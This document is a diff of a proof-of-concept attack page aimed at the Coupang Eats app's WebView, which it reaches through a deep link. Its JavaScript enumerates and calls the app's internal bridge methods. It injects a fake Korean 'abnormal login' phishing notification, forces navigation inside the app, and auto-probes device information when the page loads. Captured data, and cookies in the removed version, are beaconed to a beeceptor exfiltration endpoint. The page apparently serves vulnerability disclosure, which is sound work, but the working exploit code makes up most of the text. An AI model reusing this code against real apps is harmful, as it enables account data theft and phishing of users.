@@ -5,210 +5,278 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        body { 
-            font-family: -apple-system, sans-serif; 
-            padding: 20px;
-            background: #f5f5f5;
-        }
-        .card {
-            background: white;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 10px 0;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-        }
-        .vuln { border-left: 4px solid #ff4444; }
-        .info { border-left: 4px solid #4488ff; }
-        .success { border-left: 4px solid #44bb44; }
-        h2 { color: #333; margin-top: 0; }
-        pre {
-            background: #1a1a2e;
-            color: #0f0;
-            padding: 12px;
-            border-radius: 8px;
-            overflow-x: auto;
-            font-size: 11px;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        .tag {
-            display: inline-block;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: bold;
-            color: white;
-        }
-        .tag-critical { background: #ff4444; }
-        .tag-high { background: #ff8800; }
+        *{box-sizing:border-box;margin:0;padding:0}
+        body{font-family:-apple-system,sans-serif;padding:12px;background:#f0f0f0}
+        .c{background:#fff;border-radius:10px;padding:14px;margin:8px 0;box-shadow:0 1px 4px rgba(0,0,0,.1)}
+        .v{border-left:4px solid #e53935}
+        .s{border-left:4px solid #43a047}
+        .i{border-left:4px solid #1e88e5}
+        .w{border-left:4px solid #fb8c00}
+        h3{font-size:15px;margin-bottom:8px}
+        p{font-size:13px;color:#555;margin:4px 0}
+        pre{background:#1a1a2e;color:#0f0;padding:10px;border-radius:6px;font-size:10px;white-space:pre-wrap;word-break:break-all;margin:6px 0;max-height:200px;overflow-y:auto}
+        .tag{display:inline-block;padding:2px 6px;border-radius:3px;font-size:10px;font-weight:bold;color:#fff;margin-right:4px}
+        .tc{background:#e53935}.th{background:#fb8c00}.tm{background:#1e88e5}
+        .btn{display:inline-block;padding:8px 16px;border-radius:6px;font-size:12px;font-weight:bold;color:#fff;border:none;cursor:pointer;margin:4px}
+        .btn-r{background:#e53935}.btn-b{background:#1e88e5}.btn-o{background:#fb8c00}
     </style>
 </head>
 <body>
  
-<div class="card vuln">
-    <h2>⚠️ Vulnerability PoC — Token Theft + JS Bridge</h2>
-    <p><span class="tag tag-critical">CRITICAL</span> This page was loaded inside Coupang Eats WebView via deep link.</p>
-    <p>Your auth tokens were sent as HTTP headers to this server (check beeceptor logs).</p>
+<div class="c v">
+    <h3><span class="tag tc">CRITICAL</span> PopupWebViewActivity — JS Bridge Exploitation PoC</h3>
+    <p>This page was loaded inside Coupang Eats via the deep link:<br>
+    <code style="font-size:10px">coupangpayeats://coupaypopupwebview?url=ATTACKER_URL</code></p>
+    <p>The attacker's page has full access to the app's JavaScript bridge interfaces.</p>
 </div>
  
-<div class="card info">
-    <h2>Step 1: Auth Headers Already Captured</h2>
-    <p>When the WebView loaded this URL, the app sent the following headers to our server:</p>
-    <pre>X-EATS-ACCESS-TOKEN: [captured on server]
-Authorization: [captured on server]  
-X-COUPANG-SEC-TOKEN-BINDING: [captured on server]
-X-EATS-SESSION-ID: [captured on server]
-X-EATS-DEVICE-ID: [captured on server]
-X-MEMBER-PCID: [captured on server]
-cookie: X-EATS-UUID=... [captured on server]</pre>
-    <p>→ Check the <b>beeceptor dashboard</b> to see the actual values.</p>
+<!-- Bridge Detection -->
+<div class="c i">
+    <h3>1. JS Bridge Detection</h3>
+    <pre id="bridge-log">Scanning...</pre>
 </div>
  
-<div class="card info">
-    <h2>Step 2: JavaScript Bridge Access</h2>
-    <p>Now testing access to the app's JavaScript interfaces...</p>
-    <div id="bridge-results">
-        <pre id="output">Testing JS bridge access...\n</pre>
-    </div>
+<!-- Callback Data Capture -->
+<div class="c s" id="callback-section" style="display:none">
+    <h3>2. Data Received From App (via __BRIDGE_CALLBACK)</h3>
+    <pre id="callback-log"></pre>
 </div>
  
-<div class="card success" id="exfil-card" style="display:none;">
-    <h2>Step 3: Data Exfiltration via JS Bridge</h2>
-    <pre id="exfil-output"></pre>
+<!-- Interactive Demos -->
+<div class="c w">
+    <h3>3. Exploit Demonstrations</h3>
+    <p style="margin-bottom:8px">Each button invokes a real app function from the attacker's page:</p>
+    
+    <button class="btn btn-r" onclick="demoDeviceStatus()">
+        Steal Device Info
+    </button>
+    <button class="btn btn-r" onclick="demoAlarmPermission()">
+        Check Permissions
+    </button>
+    <button class="btn btn-o" onclick="demoInjectNotification()">
+        Inject Fake Notification
+    </button>
+    <button class="btn btn-b" onclick="demoInternalNav()">
+        Navigate Internal Screen
+    </button>
+    <button class="btn btn-o" onclick="demoSchemeAction()">
+        Trigger App Action
+    </button>
+    
+    <pre id="demo-log" style="margin-top:8px">Tap a button to demonstrate the exploit...\n</pre>
+</div>
+ 
+<!-- Exfiltration Log -->
+<div class="c v" id="exfil-section" style="display:none">
+    <h3><span class="tag tc">EXFIL</span> Data Sent to Attacker Server</h3>
+    <pre id="exfil-log"></pre>
 </div>
  
 <script>
-    var output = document.getElementById('output');
-    var exfilOutput = document.getElementById('exfil-output');
-    var exfilCard = document.getElementById('exfil-card');
-    
-    function log(msg) {
-        output.textContent += msg + "\n";
-    }
-    
-    function logExfil(msg) {
-        exfilCard.style.display = 'block';
-        exfilOutput.textContent += msg + "\n";
-    }
+var bLog = document.getElementById('bridge-log');
+var cLog = document.getElementById('callback-log');
+var cSec = document.getElementById('callback-section');
+var dLog = document.getElementById('demo-log');
+var eLog = document.getElementById('exfil-log');
+var eSec = document.getElementById('exfil-section');
  
-    // ─── Test 1: Check which JS bridge interfaces are available ───
-    log("=== Checking Available JS Bridge Interfaces ===");
-    
-    var bridges = [
-        'messageHandlers',           // CoupangEatsJavascriptInterface
-        'eatsPopupWebViewHandlers',  // EatsPopupWebViewJavascriptInterface  
-        'eatsWebEventHandlers',      // EatsWebEventJavascriptInterface
-        'eatsWebTrackingHandlers',   // EatsWebTrackingJavascriptInterface
-        'CoupangAppTracking',        // CoupangWebTrackingJavascriptInterface
-        'eatsDesignHandler',         // EatsDesignJavascriptInterface
-        'CoupangAppUtil'             // CoupayJavascriptInterface
-    ];
-    
-    var availableBridges = [];
-    bridges.forEach(function(name) {
-        try {
-            if (typeof window[name] !== 'undefined' && window[name] !== null) {
-                log("[✓] FOUND: window." + name + " = " + typeof window[name]);
-                availableBridges.push(name);
-                
-                // Enumerate methods on the bridge
-                var methods = [];
-                try {
-                    // For Android JS interfaces, we can try known method names
-                    var knownMethods = {
-                        'messageHandlers': ['parseScheme', 'close', 'schemeAction', 'openAppstore', 
-                                           'gotoStore', 'launchApp', 'openExternalHTTP', 
-                                           'addLocalNotification', 'deviceStatus', 'hasAlarmPermission',
-                                           'updateUserPreference', 'moveToNotificationSetting'],
-                        'eatsPopupWebViewHandlers': ['closePopupWebView', 'closePopupWebViewWithAnimation',
-                                                     'setPopupWebViewEdgeMargins', 'setPopupWebViewHeight',
-                                                     'setPopupWebViewWidth', 'showPopupWebView',
-                                                     'showPopupWebViewWithAnimation'],
-                        'eatsWebEventHandlers': [],
-                        'eatsWebTrackingHandlers': [],
-                        'CoupangAppTracking': []
-                    };
-                    
-                    if (knownMethods[name]) {
-                        knownMethods[name].forEach(function(method) {
-                            try {
-                                if (typeof window[name][method] === 'function') {
-                                    methods.push(method);
-                                }
-                            } catch(e) {}
-                        });
-                    }
-                    if (methods.length > 0) {
-                        log("    Methods: " + methods.join(', '));
-                    }
-                } catch(e) {}
-            } else {
-                log("[✗] NOT FOUND: window." + name);
-            }
-        } catch(e) {
-            log("[✗] ERROR checking " + name + ": " + e);
-        }
-    });
+function bl(m){bLog.textContent += m+"\n";}
+function cl(m){cSec.style.display='block';cLog.textContent += m+"\n";}
+function dl(m){dLog.textContent += m+"\n";}
+function el(m){eSec.style.display='block';eLog.textContent += m+"\n";}
  
-    // ─── Test 2: Demonstrate JS Bridge invocation ───
-    log("\n=== Demonstrating JS Bridge Invocation ===");
-    
-    // Test: Call deviceStatus to extract device info
-    if (typeof window.messageHandlers !== 'undefined') {
-        try {
-            log("[*] Calling messageHandlers.deviceStatus('{}')...");
-            // This triggers the deviceStatus callback in the app
-            // which sends device info back to the WebView via __BRIDGE_CALLBACK
-            window.messageHandlers.deviceStatus('{"callbackId":"attacker_callback"}');
-            log("[✓] deviceStatus call succeeded — app will process this!");
-            logExfil("[JS Bridge] deviceStatus invoked from attacker page");
-        } catch(e) {
-            log("[!] deviceStatus error: " + e);
-        }
-        
-        try {
-            log("[*] Calling messageHandlers.hasAlarmPermission('{}')...");
-            window.messageHandlers.hasAlarmPermission('{"callbackId":"attacker_callback2"}');
-            log("[✓] hasAlarmPermission call succeeded!");
-            logExfil("[JS Bridge] hasAlarmPermission invoked from attacker page");
-        } catch(e) {
-            log("[!] hasAlarmPermission error: " + e);
-        }
-    }
+// ============================================
+// STEP 1: Detect all available bridges
+// ============================================
+bLog.textContent = '';
+var bridgeDefs = {
+    'messageHandlers': {
+        methods: ['parseScheme','close','schemeAction','openAppstore',
+                  'gotoStore','launchApp','openExternalHTTP',
+                  'addLocalNotification','deviceStatus','hasAlarmPermission',
+                  'updateUserPreference','moveToNotificationSetting'],
+        risk: 'CRITICAL — Internal navigation, data theft, settings modification'
+    },
+    'eatsPopupWebViewHandlers': {
+        methods: ['closePopupWebView','showPopupWebView','setPopupWebViewHeight',
+                  'setPopupWebViewWidth','setPopupWebViewEdgeMargins'],
+        risk: 'MEDIUM — WebView UI manipulation'
+    },
+    'eatsWebEventHandlers': {methods:[], risk:'HIGH — Event injection'},
+    'eatsWebTrackingHandlers': {methods:[], risk:'MEDIUM — Tracking manipulation'},
+    'CoupangAppTracking': {methods:[], risk:'MEDIUM — Tracking manipulation'},
+    'eatsDesignHandler': {methods:[], risk:'LOW — UI manipulation'},
+    'CoupangAppUtil': {methods:[], risk:'HIGH — Payment utility access'}
+};
  
-    // ─── Test 3: Set up callback receiver to capture data from app ───
-    window.__BRIDGE_CALLBACK = function(data) {
-        log("\n[!!!] RECEIVED DATA FROM APP VIA BRIDGE CALLBACK:");
-        log(JSON.stringify(JSON.parse(data), null, 2));
-        logExfil("[DATA EXFIL] Received from app: " + data);
-        
-        // Exfiltrate to attacker server
-        try {
-            var img = new Image();
-            img.src = "https://evilios.free.beeceptor.com/exfil?data=" + 
-                      encodeURIComponent(data);
-            logExfil("[EXFIL] Sent captured data to attacker server");
-        } catch(e) {}
-    };
- 
-    // ─── Test 4: Exfiltrate page cookies if any ───
+var totalBridges = 0, totalMethods = 0;
+for (var name in bridgeDefs) {
     try {
-        if (document.cookie && document.cookie.length > 0) {
-            log("\n[*] WebView cookies: " + document.cookie);
-            logExfil("[COOKIES] " + document.cookie);
+        if (typeof window[name] !== 'undefined' && window[name] !== null) {
+            totalBridges++;
+            var found = [];
+            bridgeDefs[name].methods.forEach(function(m){
+                try { if(typeof window[name][m]==='function'){found.push(m); totalMethods++;} }catch(e){}
+            });
+            bl('[FOUND] ' + name);
+            bl('  Risk: ' + bridgeDefs[name].risk);
+            if(found.length > 0) bl('  Callable: ' + found.join(', '));
+            bl('');
         }
-    } catch(e) {}
+    } catch(e){}
+}
+bl('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+bl('Total bridges: ' + totalBridges + ' | Callable methods: ' + totalMethods);
  
-    // ─── Summary ───
-    log("\n=== SUMMARY ===");
-    log("Attacker-controlled URL loaded: ✓");
-    log("Auth headers sent to attacker: ✓ (check beeceptor)");
-    log("JS bridges accessible: " + availableBridges.length + " of " + bridges.length);
-    log("Bridge methods callable: ✓");
-    log("");
-    log("IMPACT: Full account takeover via stolen tokens,");
-    log("        + ability to invoke internal app functions.");
+// ============================================
+// STEP 2: Set up callback receiver to capture data
+// ============================================
+var callbackCount = 0;
+window.__BRIDGE_CALLBACK = function(rawData) {
+    callbackCount++;
+    cl('[Callback #' + callbackCount + '] ' + rawData);
+    
+    // Parse and display nicely
+    try {
+        var parsed = JSON.parse(rawData);
+        cl('  Type: ' + (parsed.type || 'unknown'));
+        if (parsed.data) {
+            cl('  Data: ' + JSON.stringify(parsed.data));
+        }
+    } catch(e){}
+    
+    // EXFILTRATE to attacker server
+    exfiltrate('bridge_callback', rawData);
+};
+ 
+function exfiltrate(type, data) {
+    el('[' + new Date().toLocaleTimeString() + '] ' + type + ': ' + 
+       (typeof data === 'string' ? data.substring(0, 200) : JSON.stringify(data)));
+    
+    try {
+        // Method 1: Image beacon (bypasses CORS)
+        var img = new Image();
+        img.src = 'https://evilios.free.beeceptor.com/exfil?type=' + 
+                  encodeURIComponent(type) + '&data=' + 
+                  encodeURIComponent(typeof data === 'string' ? data : JSON.stringify(data));
+    } catch(e){}
+    
+    try {
+        // Method 2: Navigator.sendBeacon (fire-and-forget)
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon('https://evilios.free.beeceptor.com/beacon', 
+                JSON.stringify({type: type, data: data, ts: Date.now()}));
+        }
+    } catch(e){}
+}
+ 
+// ============================================
+// STEP 3: Exploit demonstrations
+// ============================================
+ 
+function demoDeviceStatus() {
+    dl('\n[EXPLOIT] Calling messageHandlers.deviceStatus()...');
+    dl('  This requests the app to return device info to our page');
+    try {
+        window.messageHandlers.deviceStatus(
+            JSON.stringify({callbackId: 'attacker_device_' + Date.now()})
+        );
+        dl('  ✓ Call succeeded — waiting for callback data...');
+        dl('  → The app will send device info to __BRIDGE_CALLBACK');
+        exfiltrate('invoke', 'deviceStatus called');
+    } catch(e) {
+        dl('  ✗ Error: ' + e);
+    }
+}
+ 
+function demoAlarmPermission() {
+    dl('\n[EXPLOIT] Calling messageHandlers.hasAlarmPermission()...');
+    dl('  This queries the app\'s permission state');
+    try {
+        window.messageHandlers.hasAlarmPermission(
+            JSON.stringify({callbackId: 'attacker_alarm_' + Date.now()})
+        );
+        dl('  ✓ Call succeeded — waiting for callback data...');
+        exfiltrate('invoke', 'hasAlarmPermission called');
+    } catch(e) {
+        dl('  ✗ Error: ' + e);
+    }
+}
+ 
+function demoInjectNotification() {
+    dl('\n[EXPLOIT] Calling messageHandlers.addLocalNotification()...');
+    dl('  This injects a fake notification into the app!');
+    try {
+        // Craft a phishing notification
+        var payload = JSON.stringify({
+            title: "쿠팡이츠 보안 알림",
+            body: "계정에 비정상 로그인이 감지되었습니다. 비밀번호를 변경해주세요.",
+            scheduledTime: Date.now() + 5000,
+            callbackId: 'attacker_notif_' + Date.now()
+        });
+        window.messageHandlers.addLocalNotification(payload);
+        dl('  ✓ Fake notification injected!');
+        dl('  → A phishing notification will appear on the device');
+        dl('  → This could trick the user into entering credentials');
+        exfiltrate('notification_injected', payload);
+    } catch(e) {
+        dl('  ✗ Error: ' + e);
+    }
+}
+ 
+function demoInternalNav() {
+    dl('\n[EXPLOIT] Calling messageHandlers.parseScheme()...');
+    dl('  This forces the app to navigate to an internal screen');
+    try {
+        // Navigate to account/settings page via internal scheme
+        // This proves the attacker can control app navigation
+        window.messageHandlers.parseScheme('coupangeats://MyPage');
+        dl('  ✓ Internal navigation triggered!');
+        dl('  → The app navigated to an internal screen');
+        dl('  → Attacker controls where the user goes in the app');
+        exfiltrate('internal_nav', 'coupangeats://MyPage');
+    } catch(e) {
+        dl('  ✗ Error: ' + e);
+    }
+}
+ 
+function demoSchemeAction() {
+    dl('\n[EXPLOIT] Calling messageHandlers.schemeAction()...');
+    dl('  This triggers an internal app action with callback');
+    try {
+        var actionPayload = JSON.stringify({
+            url: 'coupangeats://Home',
+            callback: '__BRIDGE_CALLBACK'
+        });
+        window.messageHandlers.schemeAction(actionPayload);
+        dl('  ✓ Scheme action triggered!');
+        dl('  → The app executed an internal action');
+        dl('  → Result will be sent back to attacker via callback');
+        exfiltrate('scheme_action', actionPayload);
+    } catch(e) {
+        dl('  ✗ Error: ' + e);
+    }
+}
+ 
+// ============================================
+// Auto-run: probe for data on page load
+// ============================================
+setTimeout(function(){
+    if (typeof window.messageHandlers !== 'undefined') {
+        // Silently request device status
+        try {
+            window.messageHandlers.deviceStatus(
+                JSON.stringify({callbackId: 'auto_probe_' + Date.now()})
+            );
+        } catch(e){}
+        
+        try {
+            window.messageHandlers.hasAlarmPermission(
+                JSON.stringify({callbackId: 'auto_alarm_' + Date.now()})
+            );
+        } catch(e){}
+    }
+}, 1000);
 </script>
- 
 </body>
 </html>
